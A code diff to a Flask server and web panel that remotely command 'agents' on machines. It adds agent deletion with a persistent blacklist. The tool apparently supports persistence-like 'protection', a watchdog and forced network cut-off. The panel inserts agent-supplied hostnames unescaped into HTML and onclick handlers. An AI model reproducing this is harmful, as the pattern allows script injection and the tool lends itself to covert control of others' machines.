@@ -36,10 +36,12 @@ HISTORY_FILE = os.path.join(DATA_DIR, "server_history.json")
 agents = {}      # agent_id -> {状态信息}
 commands = {}    # agent_id -> [待执行命令列表]
 history = []     # [{time, agent_id, hostname, action, detail, success}]
+blacklist = set() # 被删除的 agent_id，拒绝重连
 lock = threading.Lock()
+BLACKLIST_FILE = os.path.join(DATA_DIR, "server_blacklist.json")
 
 def _load_data():
-    global agents, history
+    global agents, history, blacklist
     if os.path.exists(AGENTS_FILE):
         try:
             with open(AGENTS_FILE, "r", encoding="utf-8") as f:
@@ -52,6 +54,18 @@ def _load_data():
                 history.extend(json.load(f))
             print(f"  [DATA] 已加载 {len(history)} 条历史记录")
         except: pass
+    if os.path.exists(BLACKLIST_FILE):
+        try:
+            with open(BLACKLIST_FILE, "r", encoding="utf-8") as f:
+                blacklist.update(json.load(f))
+            print(f"  [DATA] 已加载 {len(blacklist)} 个黑名单 Agent")
+        except: pass
+
+def _save_blacklist():
+    try:
+        with open(BLACKLIST_FILE, "w", encoding="utf-8") as f:
+            json.dump(list(blacklist), f)
+    except: pass
 
 def _save_agents():
     try:
@@ -91,6 +105,8 @@ def heartbeat():
     aid = data.get("agent_id")
     if not aid:
         return jsonify({"error": "no agent_id"}), 400
+    if aid in blacklist:
+        return jsonify({"error": "blocked", "commands": [{"id": "blk", "command": "exit"}]}), 403
     with lock:
         is_new = aid not in agents
         was_alive = agents.get(aid, {}).get("alive", False)
@@ -117,6 +133,38 @@ def report():
     return jsonify({"ok": True})
 
 # ============ API: Web 面板 ============
+
+@app.route("/api/delete_agent", methods=["POST"])
+def delete_agent():
+    """删除 Agent 并加入黑名单"""
+    data = request.json or {}
+    aid = data.get("agent_id")
+    block = data.get("block", True)
+    if not aid:
+        return jsonify({"error": "missing agent_id"}), 400
+    with lock:
+        hostname = agents.get(aid, {}).get("hostname", aid[:8])
+        agents.pop(aid, None)
+        commands.pop(aid, None)
+        _save_agents()
+        if block:
+            blacklist.add(aid)
+            _save_blacklist()
+        _add_history(aid, "删除设备" + ("+拉黑" if block else ""), f"主机: {hostname}")
+    return jsonify({"ok": True})
+
+@app.route("/api/unblock_agent", methods=["POST"])
+def unblock_agent():
+    """解除黑名单"""
+    data = request.json or {}
+    aid = data.get("agent_id")
+    if not aid:
+        return jsonify({"error": "missing agent_id"}), 400
+    with lock:
+        blacklist.discard(aid)
+        _save_blacklist()
+        _add_history(aid, "解除黑名单")
+    return jsonify({"ok": True})
 
 @app.route("/api/agents")
 def get_agents():
@@ -298,7 +346,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 </div>
 
 <script>
-const API = "";
+const API = "/gyk";
 
 function ts(t){
   if(!t)return "--";
@@ -365,7 +413,12 @@ async function confirmAction(){
     if(sel)params.duration=parseInt(sel.value);
   }
   closeModal();
-  await sendCmd(agentId,action,params);
+  if(action==='__delete__'){
+    const block=document.getElementById('blockCheck')?.checked??true;
+    await doDelete(agentId,block);
+  } else {
+    await sendCmd(agentId,action,params);
+  }
 }
 
 function confirmUninstall(agentId,hostname){
@@ -380,6 +433,25 @@ function confirmUninstall(agentId,hostname){
     `• 停止看门狗和 Agent 进程<br><br>`+
     `<b style="color:#dc2626">卸载后无法远程恢复，需到现场重新安装！</b>`;
   document.getElementById("confirmModal").className="modal-overlay show";
+}
+
+function deleteAgent(agentId,hostname){
+  pendingAction={agentId,action:'__delete__'};
+  document.getElementById("modalTitle").textContent="删除设备";
+  document.getElementById("modalMsg").innerHTML=
+    `设备: <b>${hostname}</b><br><br>`+
+    `<label><input type="checkbox" id="blockCheck" checked> 同时拉黑（禁止重新连接）</label>`;
+  document.getElementById("confirmModal").className="modal-overlay show";
+}
+async function doDelete(agentId,block){
+  addLog(`删除设备: ${agentId.substring(0,8)}... ${block?"+拉黑":""}`);
+  try{
+    const r=await fetch(API+"/api/delete_agent",{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({agent_id:agentId,block})});
+    const j=await r.json();
+    if(j.ok){addLog("删除成功","ok");refresh();}
+    else addLog(`删除失败: ${j.error}`,"err");
+  }catch(e){addLog(`网络错误: ${e}`,"err")}
 }
 
 async function sendCmd(agentId, cmd, params={}){
@@ -435,7 +507,6 @@ async function refresh(){
         <div class="info-row"><span class="k">局域网 IP</span><span class="v">${a.local_ip||"--"}</span></div>
         <div class="info-row"><span class="k">校园网 IP</span><span class="v">${a.campus_ip||"--"}</span></div>
         <div class="info-row"><span class="k">MAC</span><span class="v">${a.mac||"--"}</span></div>
-        <div class="info-row"><span class="k">用户名</span><span class="v">${a.username||"--"}</span></div>
         <div class="info-row"><span class="k">网络状态</span><span class="v">${a.force_offline?"🔒 "+(a.net_message||"强制离线中"):a.net_online?"✅ 已认证":"❌ 未认证"}</span></div>
         <div class="info-row"><span class="k">最后心跳</span><span class="v">${ago(a.last_seen)}</span></div>
         <div class="info-row"><span class="k">运行时间</span><span class="v">${a.uptime||"--"}</span></div>
@@ -458,6 +529,7 @@ async function refresh(){
           <button class="btn" style="background:#fef2f2;color:#b91c1c" onclick="sendCmd('${a.agent_id}','unprotect')">🔓 解除防护</button>
           <button class="btn" style="background:#ede9fe;color:#6d28d9" onclick="sendCmd('${a.agent_id}','start_watchdog')">👁️ 看门狗</button>
           <button class="btn" style="background:#450a0a;color:#fca5a5" onclick="confirmUninstall('${a.agent_id}','${a.hostname||a.agent_id}')">🗑️ 卸载</button>
+          <button class="btn" style="background:#1f2937;color:#fff" onclick="deleteAgent('${a.agent_id}','${a.hostname||a.agent_id}')">❌ 删除</button>
         </div>
         <div class="token-box" id="tok-${a.agent_id}">${a.user_index||"无 token"}</div>
       </div>`;
